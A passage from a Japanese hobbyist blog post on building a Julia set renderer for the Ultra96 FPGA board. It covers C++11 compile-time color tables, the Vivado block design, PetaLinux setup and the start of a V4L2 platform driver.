<span id="cb4-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="kw">constexpr</span> <span class="kw">auto</span> color_table <span class="op">=</span> make_color_table<span class="op">();</span></span></code></pre></div>
<p><code>detail::make_array&lt;N&gt;</code> を実装するのに <a href="https://en.cppreference.com/w/cpp/utility/integer_sequence">std::make_integer_sequence</a> があると便利なのですが、C++11 の標準ライブラリには入っていないので、まずそれ相当のものを自分で実装します。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb5-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">namespace</span> detail <span class="op">{</span></span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op">...</span> Values<span class="op">&gt;</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> index_sequence <span class="op">{};</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op"> </span>N<span class="op">,</span> <span class="bu">std::</span>size_t<span class="op">...</span> Values<span class="op">&gt;</span></span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> index_sequence_impl <span class="op">:</span> index_sequence_impl<span class="op">&lt;</span>N <span class="op">-</span> <span class="dv">1</span><span class="op">,</span> N <span class="op">-</span> <span class="dv">1</span><span class="op">,</span> Values<span class="op">...&gt;</span> <span class="op">{};</span></span>
<span id="cb5-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op">...</span> Values<span class="op">&gt;</span></span>
<span id="cb5-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> index_sequence_impl<span class="op">&lt;</span><span class="dv">0</span><span class="op">,</span> Values<span class="op">...&gt;</span> <span class="op">{</span></span>
<span id="cb5-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-11" aria-hidden="true" tabindex="-1"></a>  <span class="kw">using</span> type <span class="op">=</span> index_sequence<span class="op">&lt;</span>Values<span class="op">...&gt;;</span></span>
<span id="cb5-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb5-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op"> </span>N<span class="op">&gt;</span></span>
<span id="cb5-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> make_index_sequence <span class="op">=</span> <span class="kw">typename</span> index_sequence_impl<span class="op">&lt;</span>N<span class="op">&gt;::</span>type<span class="op">;</span></span>
<span id="cb5-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="co">// namespace detail</span></span></code></pre></div>
<p>この <code>make_index_sequence&lt;N&gt;</code> は <code>index_sequence&lt;0, 1, 2, ..., N - 1&gt;</code> を作るためのもので、コンパイル時に <code>0</code> ~ <code>N - 1</code> の数値が欲しいときに使います。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb6-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op">...</span> Indeces<span class="op">&gt;</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="kw">auto</span> foo_impl<span class="op">(</span>index_sequence<span class="op">&lt;</span>Indeces<span class="op">...&gt;)</span> <span class="op">{</span></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Indeces... が 0, 1, 2, ..., N - 1 になる</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="bu">std::</span>make_tuple<span class="op">(</span>Indeces<span class="op">...);</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op"> </span>N<span class="op">&gt;</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="kw">auto</span> foo<span class="op">()</span> <span class="op">{</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> foo_impl<span class="op">(</span>make_index_sequence<span class="op">&lt;</span>N<span class="op">&gt;{});</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb6-12" aria-hidden="true" tabindex="-1"></a>foo<span class="op">&lt;</span><span class="dv">4</span><span class="op">&gt;();</span> <span class="co">// =&gt; std::tuple&lt;std::size_t&gt;{0, 1, 2, 3};</span></span></code></pre></div>
<p>これを使うと <code>detail::make_array</code> をこんな感じに実装できます。C++11 には<a href="https://en.cppreference.com/w/cpp/language/function#Return_type_deduction">関数の返り値の型推論</a>もないのでそれっぽい返り値の型も書いてやる必要があります。</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb7-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">namespace</span> detail <span class="op">{</span></span>
<span id="cb7-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="kw">class</span> Function<span class="op">,</span> <span class="bu">std::</span>size_t<span class="op">...</span> Indeces<span class="op">&gt;</span></span>
<span id="cb7-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="kw">auto</span> make_array_impl<span class="op">(</span>Function f<span class="op">,</span> index_sequence<span class="op">&lt;</span>Indeces<span class="op">...&gt;)</span></span>
<span id="cb7-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">-&gt;</span> <span class="bu">std::</span>array<span class="op">&lt;</span><span class="kw">typename</span> <span class="bu">std::</span>result_of<span class="op">&lt;</span>Function<span class="op">(</span><span class="bu">std::</span>size_t<span class="op">)&gt;::</span>type<span class="op">,</span> <span class="kw">sizeof</span><span class="op">...(</span>Indeces<span class="op">)&gt;</span> <span class="op">{</span></span>
<span id="cb7-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-6" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="op">{{</span>f<span class="op">(</span>Indeces<span class="op">)...}};</span></span>
<span id="cb7-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb7-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="bu">std::</span>size_t<span class="op"> </span>N<span class="op">,</span> <span class="kw">class</span> Function<span class="op">&gt;</span></span>
<span id="cb7-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="kw">auto</span> make_array<span class="op">(</span>Function f<span class="op">)</span></span>
<span id="cb7-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">-&gt;</span> <span class="bu">std::</span>array<span class="op">&lt;</span><span class="kw">typename</span> <span class="bu">std::</span>result_of<span class="op">&lt;</span>Function<span class="op">(</span><span class="bu">std::</span>size_t<span class="op">)&gt;::</span>type<span class="op">,</span> N<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb7-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-12" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> make_array_impl<span class="op">(</span>f<span class="op">,</span> make_index_sequence<span class="op">&lt;</span>N<span class="op">&gt;{});</span></span>
<span id="cb7-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb7-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="co">// namespace detail</span></span></code></pre></div>
<p>これらをまとめたソースコードが<a href="https://github.com/Tosainu/ultra96-fractal/blob/1ed4e5e409d6445a85741149c112322cc6fc251c/hls_ip/fractal/color_table.h">こちら</a>です。C++11 のためコードは長くなったものの、カラーパレットの変更は <code>constexpr</code> 化された <code>colorize</code> 関数を変更するだけでテーブル構築はコンパイラが勝手にやってくれるようになりましたし、構築された色変換テーブルはただの配列なので、その要素を参照する処理は FPGA デザイン上で ROM から値を1つ読むだけの軽い処理に展開されたりと、とても効果のあったチューニングでした。<strong>C++ メタプロは FPGA 開発にも役立ちます！</strong><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<p>チューニングの結果、実装した回路は 1920px x 1080px の Julia set を 約 6 fps で描画できるようになりました。ただ僕の Vivado HLS 力が足りず、当初計画していた「ぼくの考えたさいきょうの Julia set レンダリングパイプライン」になっていないので、また時間があればより高速な実装に挑戦してみたいと思っています。</p>
<h3 id="ブロックデザイン">ブロックデザイン</h3>
<p>ここまでで Julia set を描画するための回路の設計ができました。しかし、実際に動作させるためには様々な周辺回路が必要です。特に今回は Zynq UltraScale+ MPSoC のプロセッサ側 (Processing System, PS) も利用したいので、実装した Julia set 描画回路を PS から制御できるようにしたり、描画した Julia set の画像を PS から取得できるようにする必要があります。今回は Xilinx 社が提供する設計ツールである <a href="https://www.xilinx.com/products/design-tools/vivado.html">Vivado</a> の IP Integrator を使ってシステム全体 (Julia set 描画回路とその周辺回路) の設計を行いました。</p>
<p>IP は Intellectual Property の略で、再利用可能な回路デザインのことを指します。ソフトウェア開発で例えるならライブラリのようなものでしょうか。そして最近の FPGA 開発ツールは様々な IP を GUI 上で配置・接続することで目的のシステムを開発する機能を搭載しているものがあり、Vivado では IP Integrator がそれに当たります。IP Integrator で作成したデザインはブロックデザインと呼ばれています。</p>
<p>今回作成した Julia set explorer のブロックデザインは次のようになっています。表示されているものは簡略化されたもので、クリックすると Vivado から直接出力した詳細なものが表示されます。
<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/bd.pdf"><img src="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/bd_simple.png" /></a></p>
<p><code>fractal_0</code> が Vivado HLS で出力した Julia set 描画回路の IP で、<code>m_axis</code> がその出力ポートです。出力された画像の信号は、周波数の調整やデータの簡単な下処理を行うための IP を通したうえで、<a href="https://www.xilinx.com/products/intellectual-property/axi_video_dma.html">AXI Video DMA (AXI VDMA)</a> という IP に接続されています。この IP は Vivado にバンドルされているもので、ストリーム形式の映像データをメモリへ転送したり、逆にメモリから映像を読み出してストリーム形式で出力するものです。今回は描画した Julia set の画像をメモリに書き込み、PS からその画像を読み出せるようにする役割があります。</p>
上のデモでは使っていませんが、今回のブロックデザインには PL から直接 <a href="https://www.xilinx.com/support/documentation/user_guides/ug1085-zynq-ultrascale-trm.pdf#page=919">Zynq UltraScale+ MPSoC の DisplayPort Controller</a> に映像を送り込むための回路も組み込まれています。ブロックデザインの右下あたりの IP がそれにあたります。下の tweet をしていた時期の実装では、この部分の回路を使った映像の出力をしていました。
<blockquote class="twitter-tweet tw-align-center" data-lang="en">
<p lang="ja" dir="ltr">
Ultra96 で Julia set 描くやつ、6fps くらい出るようになったり、いろんなの描けるようになった <a href="https://t.co/iTE2lkyyVs">pic.twitter.com/iTE2lkyyVs</a>
</p>
— +。:.ﾟ٩(๑＞◡＜๑)۶:.｡+ﾟ (@myon___) <a href="https://twitter.com/myon___/status/1099649604088254464?ref_src=twsrc%5Etfw">February 24, 2019</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<h2 id="ultra96-向け-linux-のブートイメージを作る">Ultra96 向け Linux のブートイメージを作る</h2>
<p>PL の実装ができたので、今度は PS で動かすソフトウェアの実装をしていきます。</p>
<p>Xilinx の開発環境では、ベアメタル、FreeRTOS、Linux の開発を公式でサポートしているようです。当初はベアメタルでやっていこうと思っていたのですが、</p>
<ul>
<li>USB 接続のゲームパッドでぐりぐり動かしたい</li>
<li>現在の状況をカッコイイ感じでオーバーレイ表示したい</li>
<li>ベアメタル開発時に提供されるライブラリが好きになれず規模の大きなコードを書く気になれなかった</li>
</ul>
<p>という気持ちになってきたので Linux を利用することにしました。実装に必要な知識は多くなるけれども、ゲームパッドや GPU など各種デバイスドライバが提供されることや、普段から慣れた環境が利用できるメリットのほうが大きいと考えたためです。個人的に低レイヤ Linux に関する知識を付けていきたいなと思っていたのもあります。</p>
<h3 id="petalinux-tools-で-ultra96-向けプロジェクトを作る">PetaLinux Tools で Ultra96 向けプロジェクトを作る</h3>
<p><a href="https://www.xilinx.com/products/design-tools/embedded-software/petalinux-sdk.html">PetaLinux Tools</a> は Xilinx デバイスの PS 向け組み込み Linux 開発ツール群です。ブートローダ、カーネル、ライブラリ、アプリケーションの設定・ビルドおよびブートイメージの生成などを全てやってくれます。</p>
<p>Ultra96 向け PetaLinux プロジェクトの作成は、<a href="http://zedboard.org/support/design/24166/156">ここ</a> で公開されている Board Support Packages (BSP) を利用するのが簡単そうです。しかし表示されているバージョンが v2018.2 と古かったりして心配だったので、展開した BSP の中身を参考にしながら自分で設定することにしました。</p>
<p>といっても必要な手順はそんなに多くありません。まず以下のコマンドでプロジェクトを作成します。</p>
<pre><code>$ petalinux-create --type project --template zynqMP --name &lt;project-name&gt;
$ cd &lt;project-name&gt;
$ petalinux-config --get-hw-description=&lt;path-to-hdf-dir&gt;</code></pre>
<p>最後の <code>petalinux-config</code> を実行すると、Linux カーネルで <code>make menuconfig</code> したときのような画面が出てくるので以下の値を設定します。</p>
<pre><code>DTG Settings  ---&gt;
    (zcu100-revc) MACHINE_NAME
u-boot Configuration  ---&gt;
    (xilinx_zynqmp_zcu100_revC_defconfig) u-boot config target</code></pre>
<p>これらの値を設定することで、Ultra96 向けの Devicetree などが読み込まれるようになります。この変化のわかりやすい例としては、無線 LAN やオンボード LED がちゃんと認識されるなどがあります。</p>
<h2 id="linux-からいい感じに画像を取得できるようにする">Linux からいい感じに画像を取得できるようにする</h2>
<p>Ultra96 の Linux 開発環境ができたので、次は Linux からいい感じに Julia set 描画回路を制御するためのデバイスドライバを実装していきます。方針としては Julia set 描画回路をカメラのような映像入力デバイスとして扱えるようにし、V4L2 の API でデバイスの制御と生成された画像の取得ができるようにする、という感じです。</p>
<h3 id="xilinx-video-ip-driver">Xilinx Video IP driver</h3>
<p>さてデバイスドライバを実装するといっても、僕はデバイスドライバどころか Linux のカーネルモジュールすらまともに書いたことがなく、何もわかりません。それなのに Xilinx 特有のたくさんの PDF なドキュメントの中に Linux のデバイスドライバ実装に関するものは全くと言っていいほどなく、とても困ってしまいました。</p>
<p>それからいろいろ調べていって参考になったのが Xilinx の Linux カーネルのリポジトリ <a href="https://github.com/Xilinx/linux-xlnx">Xilinx/linux-xlnx</a> です。追加されている Xilinx プラットフォーム特有のデバイスドライバの実装やそれらについてのドキュメントがとても参考になりました。特に今回のデバイスドライバ実装には</p>
<ul>
<li><a href="https://github.com/Xilinx/linux-xlnx/blob/xilinx-v2018.3/drivers/media/platform/xilinx/xilinx-tpg.c">drivers/media/platform/xilinx/xilinx-tpg.c</a>
<ul>
<li>Test Pattern Generator (TPG) のデバイスドライバ</li>
<li>ほぼ同じ動作をするデバイスであったため</li>
<li>実装したコードもだいたい同じ感じになっている</li>
</ul></li>
<li><a href="https://github.com/Xilinx/linux-xlnx/tree/xilinx-v2018.3/Documentation/devicetree/bindings/media/xilinx">Documentation/devicetree/bindings/media/xilinx/</a>
<ul>
<li>Xilinx Video IP 関連の Devicetree の記述に関するドキュメント</li>
</ul></li>
</ul>
<p>あたりをよく参照していた記憶があります。</p>
<h3 id="デバイスドライバを実装する">デバイスドライバを実装する</h3>
<p>ということでデバイスドライバを実装しました。最終的なコードは<a href="https://github.com/Tosainu/ultra96-fractal/blob/1ed4e5e409d6445a85741149c112322cc6fc251c/petalinux_project/project-spec/meta-user/recipes-modules/kernel-module-fractal/files/fractal.c">ここ</a>です。</p>
<p>今回は <a href="https://lwn.net/Articles/448499/">Platform device API</a> と呼ばれるものを使って実装していきます。Platform device のドライバ実装でまず必要となるのがデバイスの初期化のための処理 (<code>probe</code>) と取り外された (？) ときの処理 (<code>remove</code>) です。これらの処理の登録は、必要な関数を実装し、その関数ポインタなどを対応するメンバに指定した <a href="https://elixir.bootlin.com/linux/v4.14/source/include/linux/platform_device.h#L180"><code>struct platform_driver</code></a> 型の変数を <a href="https://elixir.bootlin.com/linux/v4.14/source/include/linux/platform_device.h#L227"><code>module_platform_driver()</code></a> マクロに渡せばいいようです。</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> fractal_probe<span class="op">(</span><span class="kw">struct</span> platform_device <span class="op">*</span>dev<span class="op">)</span></span>
<span id="cb10-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb10-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-3" aria-hidden="true" tabindex="-1"></a>	<span class="co">// なんか実装</span></span>
<span id="cb10-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb10-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> fractal_remove<span class="op">(</span><span class="kw">struct</span> platform_device <span class="op">*</span>dev<span class="op">)</span></span>
<span id="cb10-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb10-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-8" aria-hidden="true" tabindex="-1"></a>	<span class="co">// なんか実装</span></span>
<span id="cb10-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb10-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">const</span> <span class="kw">struct</span> of_device_id fractal_of_id_table<span class="op">[]</span> <span class="op">=</span> <span class="op">{</span></span>
<span id="cb10-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-12" aria-hidden="true" tabindex="-1"></a>	<span class="op">{</span> <span class="op">.</span>compatible <span class="op">=</span> <span class="st">&quot;xlnx,fractal-1.0&quot;</span> <span class="op">},</span></span>
<span id="cb10-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-13" aria-hidden="true" tabindex="-1"></a>	<span class="op">{</span> <span class="op">}</span></span>
<span id="cb10-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-14" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb10-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-15" aria-hidden="true" tabindex="-1"></a>MODULE_DEVICE_TABLE<span class="op">(</span>of<span class="op">,</span> fractal_of_id_table<span class="op">);</span></span>
<span id="cb10-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="kw">struct</span> platform_driver fractal_driver <span class="op">=</span> <span class="op">{</span></span>
<span id="cb10-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-18" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>driver <span class="op">=</span> <span class="op">{</span></span>
<span id="cb10-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-19" aria-hidden="true" tabindex="-1"></a>		<span class="op">.</span>name <span class="op">=</span> <span class="st">&quot;fractal&quot;</span><span class="op">,</span></span>
<span id="cb10-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-20" aria-hidden="true" tabindex="-1"></a>		<span class="op">.</span>of_match_table <span class="op">=</span> fractal_of_id_table<span class="op">,</span></span>
<span id="cb10-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-21" aria-hidden="true" tabindex="-1"></a>	<span class="op">},</span></span>
<span id="cb10-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-22" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>probe <span class="op">=</span> fractal_probe<span class="op">,</span></span>
<span id="cb10-23"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-23" aria-hidden="true" tabindex="-1"></a>	<span class="op">.</span>remove <span class="op">=</span> fractal_remove<span class="op">,</span></span>
<span id="cb10-24"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-24" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
<span id="cb10-25"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-26"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb10-26" aria-hidden="true" tabindex="-1"></a>module_platform_driver<span class="op">(</span>fractal_driver<span class="op">);</span></span></code></pre></div>
<p><code>probe</code> に登録した関数 <code>fractal_probe</code> では、大きく分けて3つの処理を行っています。</p>
<ol type="1">
<li>ドライバ内で利用するメモリ領域の確保</li>
<li>デバイスのレジスタにアクセスするための準備</li>
<li>V4L2 デバイスのための初期化</li>
</ol>
<p>まずメモリ領域の確保です。今回実装したデバイスドライバ内で扱うデータとしてこんな感じの構造体を定義したので、</p>
<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">struct</span> fractal_device <span class="op">{</span></span>
<span id="cb11-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-2" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> device <span class="op">*</span>dev<span class="op">;</span></span>
<span id="cb11-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-3" aria-hidden="true" tabindex="-1"></a>	<span class="dt">void</span> __iomem <span class="op">*</span>iomem<span class="op">;</span></span>
<span id="cb11-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-4" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> clk <span class="op">*</span>clk<span class="op">;</span></span>
<span id="cb11-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-6" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> v4l2_subdev subdev<span class="op">;</span></span>
<span id="cb11-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-7" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> v4l2_mbus_framefmt format<span class="op">;</span></span>
<span id="cb11-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-8" aria-hidden="true" tabindex="-1"></a>	<span class="kw">struct</span> media_pad pads<span class="op">[</span><span class="dv">1</span><span class="op">];</span></span>
<span id="cb11-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
<p>こんな感じのコードでメモリ領域を確保することにしました。</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">int</span> fractal_probe<span class="op">(</span><span class="kw">struct</span> platform_device <span class="op">*</span>dev<span class="op">)</span></span>
